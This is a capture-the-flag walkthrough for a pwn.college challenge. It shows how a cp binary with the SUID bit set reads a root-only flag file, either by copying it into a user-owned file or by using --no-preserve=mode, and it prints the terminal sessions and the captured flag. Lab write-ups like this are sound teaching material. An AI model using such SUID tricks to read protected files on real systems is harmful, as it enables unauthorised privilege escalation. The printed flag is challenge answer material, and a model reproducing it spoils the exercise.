`cp` short for `copy` , is a command-line utility in Unix-like operating system used to copy files and directories from one location to another.

https://www.freecodecamp.org/news/how-to-copy-a-directory-in-linux-with-the-cp-command/

If you read this article, you will find this.

`Preserving file attributes: By default, the 'cp' command copies files without preserving their attributes such as permissions, timestamps, and ownership`

Bang! that's what we need. Let's create a file named as `text`. We then copy the `flag` file to the `text` file. As we have the read permission to the `text` file, we can `cat` it.

```bash
hacker@program-misuse-level-39:~$ /challenge/babysuid_level39 
Welcome to /challenge/babysuid_level39!

This challenge is part of a series of programs that
let you get the flag by doing tricks with permissions.

I just set the SUID bit on /usr/bin/cp.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level39) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/cp!
hacker@program-misuse-level-39:~$ cat /flag
cat: /flag: Permission denied
hacker@program-misuse-level-39:~$ touch text
hacker@program-misuse-level-39:~$ ls -l text
-rw-r--r-- 1 hacker hacker 0 Jan  3 09:19 text
hacker@program-misuse-level-39:~$ ls -l /flag
-r-------- 1 root root 57 Jan  3 09:07 /flag
hacker@program-misuse-level-39:~$ cp /flag /home/hacker/text 
hacker@program-misuse-level-39:~$ ls -l text 
-rw-r--r-- 1 hacker hacker 57 Jan  3 09:19 text
hacker@program-misuse-level-39:~$ cat text
pwn.college{8rZvvc7w67_6CgJtTqfIUBNCsns.0VM4EDL0AjNzQzW}
```

You can also mention which file attributes you don't want to preserve.

```bash
cp --no-preserve=mode /flag home/hacker
```

If you don't want to preserve any of the file attributes, you have to use `--no-preserve=all`.

```bash
hacker@program-misuse-level-39:~$ cp --no-preserve=mode /flag /home/hacker/
hacker@program-misuse-level-39:~$ ls
Desktop  demo  flag
hacker@program-misuse-level-39:~$ ls -l
total 12
drwxr-xr-x 2 hacker hacker 4096 Dec 30 07:37 Desktop
drwxr-xr-x 2 hacker hacker 4096 Jan  2 18:00 demo
-rw-r--r-- 1 root   hacker   57 Jan  3 10:39 flag
hacker@program-misuse-level-39:~$ cat flag
pwn.college{8rZvvc7w67_6CgJtTqfIUBNCsns.0VM4EDL0AjNzQzW}
```

